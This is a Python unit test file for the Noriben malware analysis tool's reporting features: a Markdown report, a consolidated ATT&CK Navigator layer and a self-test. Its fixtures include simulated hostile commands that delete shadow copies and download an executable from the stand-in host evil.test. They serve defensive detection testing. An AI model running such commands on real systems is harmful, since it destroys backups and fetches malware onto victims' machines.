"""
Unit tests for the v3.2.0 reporting/usability additions:
  * Markdown report
  * consolidated ATT&CK Navigator layer
  * --selftest engine validation

Run with:  python -m unittest discover -s tests -v
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import Noriben  # noqa: E402

SHA = 'c' * 64


def _report():
    procs = ['[CreateProcess] mal.exe:1 > vssadmin delete shadows /all\t[Child PID: 2]',
             '[CreateProcess] mal.exe:1 > cmd /c curl http://evil.test/p.exe\t[Child PID: 3]']
    files = ['[CreateFile] mal.exe:1 > C:\\a\\evil.exe\t[SHA256: {}]'.format(SHA)]
    ind = Noriben.analyze_indicators(procs, files, [], [], ['evil.test'], 'SHA256')
    tech = Noriben.detect_attack_techniques(ind)
    return Noriben.build_json_report(
        ind, tech, {'version': '3.2.0', 'source_csv': 's.csv', 'generated': 'now'},
        verdict=Noriben.score_sample(ind, tech),
        process_tree=Noriben.build_process_tree(ind['processes']),
        classification=Noriben.classify_threat(ind, tech))


class MarkdownReportTests(unittest.TestCase):
    def setUp(self):
        self.md = Noriben.build_markdown_report(_report(), {'version': '3.2.0', 'source_csv': 's.csv',
                                                            'generated': 'now'})

    def test_has_core_sections(self):
        self.assertIn('# Noriben analysis report', self.md)
        self.assertIn('## Verdict', self.md)
        self.assertIn('Likely type:', self.md)
        self.assertIn('## ATT&CK coverage by tactic', self.md)
        self.assertIn('## Process tree', self.md)

    def test_includes_iocs(self):
        self.assertIn(SHA, self.md)
        self.assertIn('http://evil.test/p.exe', self.md)
        self.assertIn('evil.test', self.md)

    def test_is_string(self):
        self.assertTrue(self.md.endswith('\n'))


class ConsolidatedNavigatorTests(unittest.TestCase):
    def test_layer_from_consolidation(self):
        def run_report(host):
            ind = Noriben.analyze_indicators(
                ['[CreateProcess] m.exe:1 > vssadmin delete shadows\t[Child PID: 2]'],
                [], [], [], [host], 'SHA256')
            return host, Noriben.build_json_report(ind, Noriben.detect_attack_techniques(ind), {'version': 'x'})

        consolidated = Noriben.consolidate_reports([run_report('a.com'), run_report('b.com')])
        layer = Noriben.build_consolidated_navigator(consolidated, {'generated': 'now'})
        self.assertEqual(layer['domain'], 'enterprise-attack')
        ids = {t['techniqueID'] for t in layer['techniques']}
        self.assertIn('T1490', ids)
        # T1490 appears in both runs -> score 2
        t1490 = next(t for t in layer['techniques'] if t['techniqueID'] == 'T1490')
        self.assertEqual(t1490['score'], 2)
        self.assertEqual(layer['gradient']['maxValue'], 2)


class SelfTestTests(unittest.TestCase):
    def test_selftest_passes(self):
        self.assertTrue(Noriben.run_selftest())


if __name__ == '__main__':
    unittest.main()
